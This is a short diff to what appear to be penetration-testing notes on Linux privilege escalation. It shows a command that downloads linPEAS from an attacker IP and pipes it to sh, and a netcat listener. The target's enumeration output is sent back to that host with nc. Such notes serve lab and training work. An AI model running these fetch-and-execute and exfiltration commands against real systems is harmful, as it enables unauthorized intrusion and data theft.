@@ -18,10 +18,13 @@ script -q -c "wget -O - http://192.168.45.177/linpeas.sh | sh" /dev/shm/linpeas.
 
 # attacker
 # Ctrl-z
-gtt
 cd escalation
 nc -lvnp 8080 > linpeas.txt
 
 # target
-cat /tmp/linpeas.txt | nc 192.168.45.177 8080
+cat /dev/shm/linpeas.txt | nc 192.168.45.177 8080
 ```
+
+## Resources
+
+- [peass-ng / linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) — script served in the flow
